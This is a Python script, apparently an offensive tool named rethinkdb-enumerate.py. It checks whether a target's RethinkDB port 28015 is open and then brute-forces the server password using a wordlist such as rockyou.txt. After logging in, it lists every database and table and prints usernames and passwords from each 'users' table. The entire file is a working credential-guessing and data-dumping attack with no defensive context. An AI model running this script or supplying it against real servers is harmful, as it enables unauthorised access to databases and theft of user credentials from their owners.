import nmap
from rethinkdb import RethinkDB
import sys
import time

def check_port_open(target, port):
    # Create Nmap PortScanner object
    nm = nmap.PortScanner()

    # Scan the specified host and port using Nmap
    nm.scan(hosts=target, ports=str(port), arguments='-Pn')

    # Check if the target is in the list of all hosts found during the scan
    if target in nm.all_hosts():
        # Retrieve information about the specified port from Nmap results
        port_state = nm[target]['tcp'][port]['state']

        # Print a brief Nmap scan report
        print(f"Nmap scan report for {target}")
        print(f"Host is {'up' if port_state == 'open' else 'down'} ({nm[target]['hostnames'][0]['name']} latency).")

        # Print a table header for the output
        print("\nPORT          STATE      SERVICE")

        # Print a row containing information about the specified port
        print(f"{port}/tcp     {port_state}     rethinkdb\n")

        # Return True if the specified port is open, False otherwise
        return port_state == 'open'
    else:
        return False

def ask_for_wordlist_path():
    # Prompt the user to enter the path to a custom wordlist and store the input in the variable 'user_input'
    user_input = input("Enter the path to a custom wordlist (default=rockyou.txt): ").strip()

    # If the input is empty, set the 'user_input' variable to the default wordlist path "/usr/share/wordlists/rockyou.txt"
    if not user_input:
        user_input = "/usr/share/wordlists/rockyou.txt"

    # Return the final user input
    return user_input


def brute_force_password(target, wordlist_path):
    print("\nAttempting brute force...")
    # Open the specified wordlist file ('wordlist_path') for reading
    with open(wordlist_path, 'r', errors='ignore') as custom_file:
        # Iterate over each line in the wordlist file
        for custom_line in custom_file:
            # Remove leading and trailing whitespaces from the current line and store it in 'custom_password'
            custom_password = custom_line.strip()
            # Attempt to establish a connection using the current password
            if attempt_connection(target, custom_password):
                # If the connection attempt is successful, retrieve RethinkDB databases using the current password
                get_rethinkdb_databases(target, custom_password)
                # Exit the function after finding the correct password
                return

    # If none of the passwords in the wordlist worked, print a failure message
    print("Brute force failed. Password not found.")
    sys.exit(1)

def get_rethinkdb_databases(target, password):
    # Create an instance of the RethinkDB driver
    r = RethinkDB()

    # Print a message indicating that the password has been found
    print(f"Password found: \033[91m{password}\033[0m")
    print("Logging in...")

    # Pause the execution for 2 seconds
    time.sleep(2)

    # Establish a connection to the RethinkDB server using the provided target, port, and password
    conn = r.connect(host=target, port=28015, password=password)

    # Get the list of RethinkDB databases using the established connection
    databases = r.db_list().run(conn)

    # Print a message indicating the start of the output
    print("\nList of databases and tables:")
    # Iterate over each database in the list of databases
    for db in databases:
        # Print the name of the current database
        print(f"\n{db}:")
        # Get the list of tables in the current database
        tables = r.db(db).table_list().run(conn)
        # Iterate over each table in the list of tables
        for table in tables:
            # Print the name of the current table
            print(f"    {table}:")

            # Check if the current table is 'users'
            if table == 'users':
                # Retrieve documents from the 'users' table
                documents = r.db(db).table(table).run(conn)

                # Iterate over each document in the list of documents
                for document in documents:
                    # Extract username and user_password from the document
                    username = document.get('id', 'N/A')
                    user_password = document.get('password', 'N/A')

                    # Check if the database is 'rethinkdb' and the username is 'admin'
                    if db=='rethinkdb' and username=='admin':
                        print(f"        Username: \033[91m{username}\033[0m Password: \033[91m{password}\033[0m")
                        # Check if the user_password is True
                    elif user_password==True:
                        # Print the username and a hidden password
                        print(f"        Username: {username}, Password: HIDDEN")
                    else:
                        # Print the username and the user_password
                        print(f"        Username: {username}, Password: {user_password}")

    # Close the established connection
    conn.close()

def attempt_connection(target, password):
    try:
        # Create an instance of the RethinkDB driver
        r = RethinkDB()
        # Attempt to establish a connection to the RethinkDB server using the provided target, port, and password
        conn = r.connect(host=target, port=28015, password=password)
        # Close the established connection
        conn.close()
        return True

        # Return True to indicate that the connection attempt was successful
    except Exception as e:
        # If an exception occurs during the connection attempt, return False
        return False

if __name__ == "__main__":
    # Check if the script is being run as the main program
    if len(sys.argv) != 2:
        print("Usage: python rethinkdb-enumerate.py <target>")
        sys.exit(1)

    # Retrieve the target address from the command-line arguments
    target_address = sys.argv[1]

    # Check if the RethinkDB port (28015) is open on the target
    check_port_result = check_port_open(target_address, 28015)

    # If the port is open, prompt the user for further action
    if check_port_result:
        # If the user agrees, ask for the path to a wordlist and attempt a brute-force attack
        user_input = input(f"The port 28015 is OPEN. \n\nAttempt brute force? (y/n)? ").lower()
        if user_input == 'y' or user_input == 'Y':
            password_file = ask_for_wordlist_path()
            brute_force_password(target_address, password_file)
        # If the user declines, print a message and exit
        elif user_input == 'n' or user_input == 'N':
            print("Brute force aborted.")
            sys.exit(0)
        else:
            # If the user provides invalid input, print an error message and exit with a non-zero status
            print("Invalid input. Exiting.")
            sys.exit(1)
    else:
        # If the port is closed, print a message and exit
        print(f"The port 28015 is CLOSED. Cannot proceed.")
        sys.exit(1)
